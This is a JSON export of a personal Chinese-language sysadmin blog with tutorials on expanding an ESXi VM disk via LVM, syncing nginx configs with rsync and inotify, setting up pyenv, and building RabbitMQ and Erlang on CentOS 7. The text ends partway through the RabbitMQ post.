{"meta":{"title":"Netb2c's Blog","subtitle":"We'd better struggle for the future rather than regret for the past.","description":"Life & Work Essays.","author":"Netb2c","url":"http://blog.unixmen.cn"},"pages":[{"title":"","date":"2018-06-08T18:35:28.770Z","updated":"2017-03-03T06:54:20.070Z","comments":true,"path":"404.html","permalink":"http://blog.unixmen.cn/404.html","excerpt":"","text":"","raw":null,"content":null},{"title":"About","date":"2017-02-15T08:36:30.000Z","updated":"2017-03-06T06:54:49.498Z","comments":true,"path":"about/index.html","permalink":"http://blog.unixmen.cn/about/index.html","excerpt":"","text":"Netb2c Nickname: netb2c Position: DevOps Email: netb2c(a)linux.cn Blog: http://blog.unixmen.cn Github:netb2c","raw":null,"content":null},{"title":"第一篇博客","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T03:47:05.622Z","comments":true,"path":"第一篇博客/index.html","permalink":"http://blog.unixmen.cn/第一篇博客/index.html","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null}],"posts":[{"title":"ESXI虚拟机磁盘在线扩容","slug":"ESXI虚拟机磁盘在线扩容","date":"2018-06-11T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/06/12/ESXI虚拟机磁盘在线扩容/","link":"","permalink":"http://blog.unixmen.cn/2018/06/12/ESXI虚拟机磁盘在线扩容/","excerpt":"内网有一台ESXI上的虚拟机，用来做构建服务的，因为构建项目逐渐增加，磁盘空间渐渐不足，严重影响使用。为解决问题，当务之急是将磁盘分区进行扩容，因为磁盘分区做的LVM，可以很方便的动态扩容，在物理机上可以通过加硬盘的方式来解决问题，而ESXI的虚拟机就更方便了，直接将虚拟机关机修改磁盘大小即可，但是修改完的硬盘空间并不会自动扩展到磁盘分区中，还需要我们做一些操作才可以使用，具体操作如下：\n1. 创建新分区ESXI修改完磁盘大小后，增加的磁盘空间表现为当前磁盘剩余未分配空间，需要使用剩余未分配空间新建分区12345678910# fdisk /dev/sdan       （新建分区）p       （选择分区类型主分区或扩展分区）3       （选择分区编号）回车回车t\t（修改分区类型）3\t（选择分区）8e\t（Changed type of partition 'Linux' to 'Linux LVM'，修改成LVM类型）w\t（写分区表退出）","text":"内网有一台ESXI上的虚拟机，用来做构建服务的，因为构建项目逐渐增加，磁盘空间渐渐不足，严重影响使用。为解决问题，当务之急是将磁盘分区进行扩容，因为磁盘分区做的LVM，可以很方便的动态扩容，在物理机上可以通过加硬盘的方式来解决问题，而ESXI的虚拟机就更方便了，直接将虚拟机关机修改磁盘大小即可，但是修改完的硬盘空间并不会自动扩展到磁盘分区中，还需要我们做一些操作才可以使用，具体操作如下： 1. 创建新分区ESXI修改完磁盘大小后，增加的磁盘空间表现为当前磁盘剩余未分配空间，需要使用剩余未分配空间新建分区12345678910# fdisk /dev/sdan （新建分区）p （选择分区类型主分区或扩展分区）3 （选择分区编号）回车回车t （修改分区类型）3 （选择分区）8e （Changed type of partition 'Linux' to 'Linux LVM'，修改成LVM类型）w （写分区表退出） 123456使用命令重新读取分区表，或者重启机器# partprobeWarning: Unable to open /dev/sr0 read-write (Read-only file system). /dev/sr0 has been opened read-only.Centos6系统上使用# partx 12345格式化新磁盘分区xfs文件系统# mkfs.xfs /dev/sda3 （此处分区格式要与已有的LVM卷中分区格式一致）EXT4文件系统# mkfs.ext4 /dev/sda3 2. 添加新LVM分区到已有的LVM组，实现扩容进入LVM管理12# lvmlvm&gt; 12初始化新分区lvm&gt; pvcreate /dev/sda3 1234查看卷组名lvm&gt; vgdisplay --- Volume group --- VG Name test_build 123将初始化过的分区加入到虚拟卷组lvm&gt; vgextend test_build /dev/sda3 Volume group \"test_build\" successfully extended 1234567891011121314151617181920212223242526272829扩展已有卷的容量lvm&gt; vgdisplay --- Volume group --- VG Name test_build System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 4 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 2 Act PV 2 VG Size &lt;399.53 GiB PE Size 4.00 MiB Total PE 102279 Alloc PE / Size 51080 / 199.53 GiB Free PE / Size 51199 / &lt;200.00 GiB VG UUID wVZavM-oLX7-iWf1-fKiO-TGVM-Oa0r-2mcTsDlvm&gt; lvextend -l +51199 /dev/mapper/test_build-data Size of logical volume test_build/data changed from 152.96 GiB (39159 extents) to 352.96 GiB (90358 extents). Logical volume test_build/data successfully resized.上述参数中，-l,指定逻辑卷的大小，单位为PE数;51199为通过vgdisplay命令查询到的卷中空闲空间，目录参数为df命令查询到的需要扩展的挂载点位置。 12345678910111213141516171819202122232425查看卷容量lvm&gt; pvdisplay --- Physical volume --- PV Name /dev/sda2 VG Name test_build PV Size 199.53 GiB / not usable 3.00 MiB Allocatable yes (but full) PE Size 4.00 MiB Total PE 51080 Free PE 0 Allocated PE 51080 PV UUID 2gmX3A-Bpz4-hCQ0-5fjr-CiCM-peYZ-BMDi9W --- Physical volume --- PV Name /dev/sda3 VG Name test_build PV Size 200.00 GiB / not usable 4.00 MiB Allocatable yes (but full) PE Size 4.00 MiB Total PE 51199 Free PE 0 Allocated PE 51199 PV UUID wJe39M-0326-n2Ge-6m2d-IlTR-Gubg-UXRhielvm&gt; quit 3. 文件系统扩容卷扩容完成后，系统并不能直接使用扩容空间，还需要将文件系统扩容123456789101112131415xfs文件系统# xfs_growfs /dev/mapper/test_build-datameta-data=/dev/mapper/test_build-data isize=512 agcount=4, agsize=10024704 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0 spinodes=0data = bsize=4096 blocks=40098816, imaxpct=25 = sunit=0 swidth=0 blksnaming =version 2 bsize=4096 ascii-ci=0 ftype=1log =internal bsize=4096 blocks=19579, version=2 = sectsz=512 sunit=0 blks, lazy-count=1realtime =none extsz=4096 blocks=0, rtextents=0data blocks changed from 40098816 to 92526592EXT4文件系统# resize2fs /dev/mapper/test_build-data 1234567891011查看分区大小# df -hlFilesystem Size Used Avail Use% Mounted on/dev/mapper/test_build-root 47G 2.3G 45G 5% /devtmpfs 908M 0 908M 0% /devtmpfs 920M 0 920M 0% /dev/shmtmpfs 920M 8.8M 911M 1% /runtmpfs 920M 0 920M 0% /sys/fs/cgroup/dev/mapper/test_build-data 353G 456M 353G 1% /data/dev/sda1 473M 169M 305M 36% /boottmpfs 184M 0 184M 0% /run/user/0 扩容成功","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"ESXI","slug":"Linux/ESXI","permalink":"http://blog.unixmen.cn/categories/Linux/ESXI/"}],"tags":[{"name":"esxi","slug":"esxi","permalink":"http://blog.unixmen.cn/tags/esxi/"},{"name":"磁盘在线扩容","slug":"磁盘在线扩容","permalink":"http://blog.unixmen.cn/tags/磁盘在线扩容/"}]},{"title":"配置Rsync+inotify实现文件实时同步","slug":"配置rsync+inotify实现文件实时同步","date":"2018-06-03T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/06/04/配置rsync+inotify实现文件实时同步/","link":"","permalink":"http://blog.unixmen.cn/2018/06/04/配置rsync+inotify实现文件实时同步/","excerpt":"1. 项目背景\n因为工作需要，需部署一套nginx负载均衡群集，群集须保证所有nginx节点配置文件完全一致；要解决不同服务器之间数据一致，一般采用NFS共享文件、DRBD镜像复制或rsync文件同步来实现，相对于rsync，前两者配置稍麻烦，此处我选择rsync文件同步来保证配置文件一致性。\n\n\nrsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。但是rsync仅仅是同步工具，并不能做到监控文件变化并实时同步，因此还需要配合inotify来实现文件实时同步。\n\n\ninotify是一种强大的、细粒度的、异步的文件系统事件控制机制。linux内核从2.6.13起，加入了inotify支持，通过inotify可以监控文件系统中添加、删除、修改、移动等各种事件，利用这个内核接口，第三方软件就可以监控文件系统下文件的各种变化情况，而inotify-tools正是实施监控的软件。\n\n\n在这里，我们使用inotify监控文件变化，同时通过脚本来触发rsync将发生变化的文件同步到目标服务器。\n\n\n术语定义：客户端–&gt;源服务器（SRC）服务端–&gt;目标服务器（DEST）\n","text":"1. 项目背景 因为工作需要，需部署一套nginx负载均衡群集，群集须保证所有nginx节点配置文件完全一致；要解决不同服务器之间数据一致，一般采用NFS共享文件、DRBD镜像复制或rsync文件同步来实现，相对于rsync，前两者配置稍麻烦，此处我选择rsync文件同步来保证配置文件一致性。 rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。但是rsync仅仅是同步工具，并不能做到监控文件变化并实时同步，因此还需要配合inotify来实现文件实时同步。 inotify是一种强大的、细粒度的、异步的文件系统事件控制机制。linux内核从2.6.13起，加入了inotify支持，通过inotify可以监控文件系统中添加、删除、修改、移动等各种事件，利用这个内核接口，第三方软件就可以监控文件系统下文件的各种变化情况，而inotify-tools正是实施监控的软件。 在这里，我们使用inotify监控文件变化，同时通过脚本来触发rsync将发生变化的文件同步到目标服务器。 术语定义：客户端–&gt;源服务器（SRC）服务端–&gt;目标服务器（DEST） 2. 安装配置rsync2.1 安装rsync服务123456# yum install -y gcc gcc-c++# yum install -y rsync关闭SELINUX（服务端SELINUX一定要关掉，不然rsync同步的时候会报错）# setenforce 0# vim /etc/selinux/configSELINUX=disabled 2.2 编辑rsync配置文件1234567891011121314151617181920212223# vim /etc/rsyncd.confuid = root # 此处的用户及用户组必须要拥有操作待同步文件的权限gid = rootport = 873 # rsync默认监听端口873，也可以自定义use chroot = no max connections = 5pid file = /var/run/rsyncd.pidexclude = lost+found/ # 排除同步文件transfer logging = yestimeout = 900ignore nonreadable = yesdont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2[nginx_conf]path = /data/program/nginx/conf/ # rsync服务端数据目录路径，即同步到目标目录后的存放路径，按需配置comment = nginx_conf # 此处定义模块名称，这个模块名称在rsync同步命令中需要调用ignore errorsread only = nolist = yesauth users = rsync # 设置执行rsync同步的用户名，此用户名可自定义，不需与系统用户一致，需要与secrets file中设置的用户名匹配secrets file = /data/program/rsync/rsync_server.passwd # 用户认证配置文件，保存同步时使用的用户名密码，可设置多个用户名密码hosts allow = 192.168.2.182 #允许进行同步的客户端地址，可设置多个，用英文逗号分隔 2.3 编辑rsync用户认证配置文件123456789服务端# vim /data/program/rsync/rsync_server.passwdrsync:rsync客户端# vim /data/program/rsync/rsync_client.passwdrsync双向同步的时候，两台服务器上都需要配置这两个文件。 2.4 修改配置文件权限123# chmod 600 /data/program/rsync/rsync_server.passwd# chmod 600 /data/program/rsync/rsync_client.passwd# chmod 600 /etc/rsyncd.conf 2.5 启动rsync服务12# systemctl enable rsyncd# systemctl start rsyncd 2.6 双向同步配置单向同步1如果仅需单向同步，只需要在服务端启动rsyncd服务，客户端无需启动服务，可直接执行rsync命令。 双向同步1如需双向同步，则需要在两台服务器启动rsyncd服务，两台服务器互为C--&gt;S。 此处我选择双向同步，则需在两台服务器上同时配置服务。 3. 安装配置inotify-tools1# yum install -y inotify-tools 4. 配置inotify_rsync同步脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445# cd /data/program/rsync/# vim inotify_rsync.sh#!/bin/bashsource /etc/profilesrc=/data/program/nginx/conf # 需要同步的源路径des=nginx_conf # 目标服务器上rsyncd.conf中定义的名称(comment)rsync_passwd_file=/data/program/rsync/rsync_client.passwd # rsync验证的密码文件ip=192.168.2.182 # 目标服务器user=rsync # rsyncd.conf中定义的验证用户名(auth users)include_list=/data/program/rsync/include #指定同步文件写入列表文件，列表文件路径必须用绝对路径，列表文件中内容用相对路径log_path=/data/program/rsync/logs/$(date +%Y-%m-%d).log #同步日志输出到日志文件cd $&#123;src&#125;inotifywait -mrq --format '%Xe %w%f' -e modify,create,delete,attrib,close_write,move ./ | while read filedo INO_EVENT=$(echo $file | awk '&#123;print $1&#125;') # 把inotify输出切割 把事件类型部分赋值给INO_EVENT INO_FILE=$(echo $file | awk '&#123;print $2&#125;') # 把inotify输出切割 把文件路径部分赋值给INO_FILE echo \"-------------------------------$(date)------------------------------------\" &gt;&gt; $&#123;log_path&#125; echo $file &gt;&gt; $&#123;log_path&#125; #增加、修改、写入完成、移动进事件 #增、改放在同一个判断，因为他们都是针对文件的操作，即使是新建目录，要同步的也只是一个空目录，不会影响速度。 if [[ $INO_EVENT =~ 'CREATE' ]] || [[ $INO_EVENT =~ 'MODIFY' ]] || [[ $INO_EVENT =~ 'CLOSE_WRITE' ]] || [[ $INO_EVENT =~ 'MOVED_TO' ]] # 判断事件类型 then echo 'CREATE or MODIFY or CLOSE_WRITE or MOVED_TO' &gt;&gt; $&#123;log_path&#125; rsync -avrtzopgcRP --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125; &gt;&gt; $&#123;log_path&#125; fi #删除、移动出事件 if [[ $INO_EVENT =~ 'DELETE' ]] || [[ $INO_EVENT =~ 'MOVED_FROM' ]] then echo 'DELETE or MOVED_FROM' &gt;&gt; $&#123;log_path&#125; rsync -avrtzopgcRP --delete --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125; &gt;&gt; $&#123;log_path&#125; fi #修改属性事件 指 touch chgrp chmod chown等操作 if [[ $INO_EVENT =~ 'ATTRIB' ]] then echo 'ATTRIB' &gt;&gt; $&#123;log_path&#125; if [ ! -d \"$INO_FILE\" ] # 如果修改属性的是目录 则不同步，因为同步目录会发生递归扫描，等此目录下的文件发生同步时，rsync会顺带更新此目录。 then rsync -avrtzopgcRP --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125; &gt;&gt; $&#123;log_path&#125; fi fidone 编辑指定同步文件列表123456# vim /data/program/rsync/includenginx.confnginx_conf/conf.d/将指定同步的文件写到该列表文件中，需使用相对路径 给同步脚本添加执行权限1# chmod +x inotify_rsync.sh 5. 将同步脚本放到后台启动1# nohup /data/program/rsync/inotify_rsync.sh &gt;/data/program/rsync/nohup.out 2&gt;&amp;1 &amp; 6. 将同步脚本加到开机启动1# echo \"nohup /data/program/rsync/inotify_rsync.sh &gt;/data/program/rsync/nohup.out 2&gt;&amp;1 &amp;\" &gt;&gt; /etc/rc.local 7. rsync+inotifywait部分参数说明7.1 rsync参数说明12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061-v, --verbose 详细模式输出-q, --quiet 精简输出模式-c, --checksum 打开校验开关，强制对文件传输进行校验-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD-r, --recursive 对子目录以递归模式处理-R, --relative 使用相对路径信息-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。--backup-dir 将备份文件(如~filename)存放在在目录下。-suffix=SUFFIX 定义备份文件前缀-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)-l, --links 保留软链结-L, --copy-links 想对待常规文件一样处理软链结--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结--safe-links 忽略指向SRC路径目录树以外的链结-H, --hard-links 保留硬链结-p, --perms 保持文件权限-o, --owner 保持文件属主信息-g, --group 保持文件属组信息-D, --devices 保持设备文件信息-t, --times 保持文件时间信息-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间-n, --dry-run现实哪些文件将被传输-W, --whole-file 拷贝文件，不进行增量检测-x, --one-file-system 不要跨越文件系统边界-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节-e, --rsh=COMMAND 指定使用rsh、ssh方式进行数据同步--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件--delete 删除那些DST中SRC没有的文件--delete-excluded 同样删除接收端那些被该选项指定排除的文件--delete-after 传输结束以后再删除--ignore-errors 及时出现IO错误也进行删除--max-delete=NUM 最多删除NUM个文件--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输--force 强制删除目录，即使不为空--numeric-ids 不将数字的用户和组ID匹配为用户名和组名--timeout=TIME IP超时时间，单位为秒-I, --ignore-times 不跳过那些有同样的时间和长度的文件--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0-T --temp-dir=DIR 在DIR中创建临时文件--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份-P 等同于 --partial--progress 显示备份过程-z, --compress 对备份的文件在传输时进行压缩处理--exclude=PATTERN 指定排除不需要传输的文件模式--include=PATTERN 指定不排除而需要传输的文件模式--exclude-from=FILE 排除FILE中指定模式的文件--include-from=FILE 不排除FILE指定模式匹配的文件--version 打印版本信息--address 绑定到特定的地址--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件--port=PORT 指定其他的rsync服务端口--blocking-io 对远程shell使用阻塞IO-stats 给出某些文件的传输状态--progress 在传输时现实传输过程--log-format=formAT 指定日志文件格式--password-file=FILE 从FILE中得到密码--bwlimit=KBPS 限制I/O带宽，KBytes per second-h, --help 显示帮助信息 7.2 inotifywait参数说明1234567891011121314151617181920-h,–help 输出帮助信息-m,–monitor 始终保持事件监听状态，接收到一个事件而不退出，无限期地执行。默认的行为是接收到一个事件后立即退出-r,–recursive 递归查询目录-q,–quiet 只打印监控事件的信息–exclude 正则匹配需要排除的文件，区分大小写–excludei 正则匹配需要排除的文件，不区分大小写-t,–timeout 超时时间，如果为0，则无限期地执行下去–timefmt 指定时间输出格式，用于–format选项中的%T格式–format 指定输出格式 %w 表示发生事件的目录 %f 表示发生事件的文件 %e 表示发生的事件 %Xe 事件以“X”分隔 %T 使用由–timefmt定义的时间格式-e,–event 指定监视的事件–fromfile 从文件读取需要监视的文件或排除的文件，一个文件一行，排除的文件以@开头-d, –daemon 跟–monitor一样，除了是在后台运行，需要指定–outfile把事情输出到一个文件。也意味着使用了–syslog。-o, –outfile 输出事情到一个文件而不是标准输出。-s, –syslog 输出错误信息到系统日志-c, –csv 输出csv格式 7.3 inotifywait events事件说明123456789101112131415access 读取文件或目录内容modify 修改文件或目录内容attrib 文件或目录属性更改，如权限，时间戳等close_write 以可写模式打开的文件被关闭，不代表此文件一定已经写入数据close_nowrite 以只读模式打开的文件被关闭close 文件被关闭，不管它是如何打开的open 文件打开moved_to 一个文件或目录移动到监听的目录，即使是在同一目录内移动，此事件也触发moved_from 一个文件或目录移出监听的目录，即使是在同一目录内移动，此事件也触发move 包括moved_to和 moved_frommove_self 文件或目录被移除，之后不再监听此文件或目录create 文件或目录创建delete 文件或目录删除delete_self 文件或目录移除，之后不再监听此文件或目录unmount 文件系统取消挂载，之后不再监听此文件系统","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Centos","slug":"Linux/Centos","permalink":"http://blog.unixmen.cn/categories/Linux/Centos/"},{"name":"rsync","slug":"Linux/Centos/rsync","permalink":"http://blog.unixmen.cn/categories/Linux/Centos/rsync/"}],"tags":[{"name":"rsync","slug":"rsync","permalink":"http://blog.unixmen.cn/tags/rsync/"},{"name":"inotify","slug":"inotify","permalink":"http://blog.unixmen.cn/tags/inotify/"},{"name":"文件同步","slug":"文件同步","permalink":"http://blog.unixmen.cn/tags/文件同步/"}]},{"title":"Pyenv安装配置","slug":"pyenv安装配置","date":"2018-05-28T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/05/29/pyenv安装配置/","link":"","permalink":"http://blog.unixmen.cn/2018/05/29/pyenv安装配置/","excerpt":"\npyenv是一个Python多版本管理工具，它可以改变全局的Python版本，安装多个版本的Python，设置目录级别的Python版本，还能创建和管理virtual python environments 。所有的设置都是用户级别的操作，不需要sudo 命令。pyenv通过系统修改环境变量来实现Python不同版本的切换，它在PATH的最前面插入了一个垫片路径（shims）：~/.pyenv/shims:/usr/local/bin:/usr/bin:/bin。所有对 Python 可执行文件的查找都会首先被这个 shims 路径截获，从而使后方的系统路径失效。\n\n1. 安装pyenv1.1 git拉取pyenv代码1# git clone https://github.com/pyenv/pyenv.git ~/.pyenv","text":"pyenv是一个Python多版本管理工具，它可以改变全局的Python版本，安装多个版本的Python，设置目录级别的Python版本，还能创建和管理virtual python environments 。所有的设置都是用户级别的操作，不需要sudo 命令。pyenv通过系统修改环境变量来实现Python不同版本的切换，它在PATH的最前面插入了一个垫片路径（shims）：~/.pyenv/shims:/usr/local/bin:/usr/bin:/bin。所有对 Python 可执行文件的查找都会首先被这个 shims 路径截获，从而使后方的系统路径失效。 1. 安装pyenv1.1 git拉取pyenv代码1# git clone https://github.com/pyenv/pyenv.git ~/.pyenv 1.2 修改配置文件123# echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' &gt;&gt; ~/.bash_profile# echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' &gt;&gt; ~/.bash_profile# echo -e 'if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then\\n eval \"$(pyenv init -)\"\\nfi' &gt;&gt; ~/.bash_profile 1.3 重新载入变量配置1# source ~/.bashrc 1.4 验证安装1# pyenv versions 2. 使用pyenv安装多版本Python2.1 安装依赖包在使用pyenv安装Python之前，需要安装相应的依赖包，否则在安装过程中会报错。123456# yum install -y gcc*# yum install -y readline readline-devel readline-static# yum install -y zlib-devel# yum install -y bzip2-devel bzip2-libs# yum install -y openssl openssl-devel openssl-static# yum install -y sqlite-devel 2.2 pyenv常用命令查看本机安装 Python 版本12# pyenv versions* 表示当前正在使用的 Python 版本 查看可安装Python版本1# pyenv install -l python安装与卸载1234# pyenv install 2.7.15 # 安装python# pyenv uninstall 2.7.15 # 卸载python python切换123456789101112# pyenv global 2.7.15 # 设置全局的 Python 版本，通过将版本号写入 ~/.pyenv/version 文件的方式。# pyenv local 2.7.15 # 设置 Python 本地版本，通过将版本号写入当前目录下的 .python-version 文件的方式。通过这种方式设置的 Python 版本优先级较 global 高。python优先级shell &gt; local &gt; globalpyenv 会从当前目录开始向上逐级查找 .python-version 文件，直到根目录为止。若找不到，就用 global 版本。# pyenv shell 2.7.15 # 设置面向 shell 的 Python 版本，通过设置当前 shell 的 PYENV_VERSION 环境变量的方式。这个版本的优先级比 local 和 global 都要高。–unset 参数可以用于取消当前 shell 设定的版本。# pyenv shell --unset# pyenv rehash # 创建垫片路径（为所有已安装的可执行文件创建 shims，如：~/.pyenv/versions/*/bin/*，因此，每当你增删了 Python 版本或带有可执行文件的包（如 pip）以后，都应该执行一次本命令） 查看所有pyenv支持命令1# pyenv commands 2.3 安装过程中遇到的相关问题解决2.3.1 安装Python过程慢pyenv安装Python过程1pyenv默认会从官网下载相应Python压缩包，放到/tmp目录下，然后在/tmp目录编译安装，安装在~/.pyenv/versions/下面。 解决下载安装慢的问题1234567因为pyenv默认会从Python官网下载压缩包，因为众所周知的原因，国内访问Python官网不稳定，因此在下载过程中会非常慢，解决该问题有两个办法：1. 手动将Python压缩包下载到~/.pyenv/cache/目录下，pyenv会校验md5值和完整性，确认无误的话就不会重新下载直接从这里安装；这里有个需要注意的地方，需要把下载的Python压缩包后缀名由.tgz修改为.tar.gz（切记不能采用把.tgz解压之后再压缩成.tar.gz 的方式，因为这样的话会导致源文件的md5值发生变化而校验失败重新下载。）2. 直接修改pyenv配置文件，将Python下载地址修改为国内Python镜像源地址，在此，推荐第二种方法，我这里使用的是sohu的镜像源；修改~/.pyenv/plugins/python-build/share/python-build/目录下对应版本号文件，你需要安装哪个版本就修改哪个版本号，替换下载地址为sohu镜像源地址：# cd ~/.pyenv/plugins/python-build/share/python-build/# vim 3.6.5 #install_package \"Python-3.6.5\" \"https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tar.xz#f434053ba1b5c8a5cc597e966ead3c5143012af827fd3f0697d21450bb8d87a6 install_package \"Python-3.6.5\" \"http://mirrors.sohu.com/python/3.6.5/Python-3.6.5.tar.xz#f434053ba1b5c8a5cc597e966ead3c5143012af827fd3f0697d21450bb8d87a6 2.3.2 pip安装库timeoutpip安装库的时候，也会经常出现现在速度很慢或者timeout的状况，更换成国内镜像源即可解决问题12345678创建一个pip.conf文件# mkdir ~/.pip# vim ~/.pip/pip.conf[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Python","slug":"Linux/Python","permalink":"http://blog.unixmen.cn/categories/Linux/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.unixmen.cn/tags/Python/"},{"name":"pyenv","slug":"pyenv","permalink":"http://blog.unixmen.cn/tags/pyenv/"}]},{"title":"Centos7安装配置RabbitMQ","slug":"Centos7安装配置RabbitMQ","date":"2018-05-06T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/05/07/Centos7安装配置RabbitMQ/","link":"","permalink":"http://blog.unixmen.cn/2018/05/07/Centos7安装配置RabbitMQ/","excerpt":"1. RabbitMQ介绍\nRabbitMQ是实现AMQP（高级消息队列协议）的消息中间件的一种，最初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。RabbitMQ主要是为了实现系统之间的双向解耦而实现的。当生产者大量产生数据时，消费者无法快速消费，那么需要一个中间层。保存这个数据。\n\n\nAMQP，即Advanced Message Queuing Protocol，高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。\n\n\nRabbitMQ是一个开源的AMQP实现，服务器端用Erlang语言编写，支持多种客户端，如：Python、Ruby、.NET、Java、JMS、C、PHP、ActionScript、XMPP、STOMP等，支持AJAX。用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。\n\n\n---以上内容我抄的\n","text":"1. RabbitMQ介绍 RabbitMQ是实现AMQP（高级消息队列协议）的消息中间件的一种，最初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。RabbitMQ主要是为了实现系统之间的双向解耦而实现的。当生产者大量产生数据时，消费者无法快速消费，那么需要一个中间层。保存这个数据。 AMQP，即Advanced Message Queuing Protocol，高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。 RabbitMQ是一个开源的AMQP实现，服务器端用Erlang语言编写，支持多种客户端，如：Python、Ruby、.NET、Java、JMS、C、PHP、ActionScript、XMPP、STOMP等，支持AJAX。用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。 ---以上内容我抄的 2. 准备所需软件包12# ls /data/src/jdk-8u171-linux-x64.rpm otp_src_18.3.tar.gz rabbitmq-server-generic-unix-3.6.6.tar wxWidgets-3.0.4.tar 3. 编译安装Erlang 因为RabbitMQ是用Erlang语言编写的，所以在编译安装RabbitMQ之前必须要先编译安装Erlang，Erlang的安装可以使用yum安装，也可以使用源码包编译安装；Centos7上yum安装的Erlang版本太低，因此，此处我们采用源码包编译安装。 3.1 安装依赖环境1234567# yum install -y gcc*# yum install -y ncurses-devel# yum install -y unixODBC unixODBC-devel# yum install -y openssl-devel# yum install -y mesa* freeglut*# yum install -y fop# yum install -y libxslt-devel 3.2 编译安装wxWidgetswxWidgets是一个开源的跨平台的C++构架库（framework），它可以提供GUI（图形用户界面）和其它工具。wxWidgets支持在Erlang的编译安装过程中是非必需的，但Erlang的新GUI工具是基于wxWidgets开发的，因此要使用这些工具必须安装wxWidgets。12345678# wget https://github.com/wxWidgets/wxWidgets/releases/download/v3.0.4/wxWidgets-3.0.4.tar.bz2# bzip2 -d wxWidgets-3.0.4.tar.bz2# tar xf wxWidgets-3.0.4.tar# cd wxWidgets-3.0.4/# yum install -y gtk+-devel# yum install -y gtk2-devel binutils-devel# ./configure --with-opengl --enable-debug --enable-unicode# make &amp;&amp; make install 注意：此处需注意的是，gtk+-devel、gtk2-devel、binutils-devel是必需的依赖环境，否则wxWidgets的make过程会报错。 3.3 编译安装Erlang1234# tar zxf otp_src_18.3.tar.gz# cd otp_src_18.3# ./configure# make &amp;&amp; make install 测试Erlang是否安装成功12345# erlErlang/OTP 18 [erts-7.3] [source] [64-bit] [smp:4:4] [async-threads:10] [kernel-poll:false]Eshell V7.3 (abort with ^G)1&gt; halt(). 4. 安装配置RabbitMQRabbitMQ提供了yum安装、rpm安装、编译安装、二进制包等多种方式，此处采用的是二进制包直接解压使用。 4.1 解压RabbitMQ二进制包并移动到指定目录12# tar xf rabbitmq-server-generic-unix-3.6.6.tar# mv rabbitmq_server-3.6.6 /data/program/rabbitmq 配置环境变量123# vim /etc/profile.d/rabbitmq.shexport PATH=/data/program/rabbitmq/sbin:$PATH# source /etc/profile 4.2 启动RabbitMQ服务12# rabbitmq-server -detached# rabbitmqctl 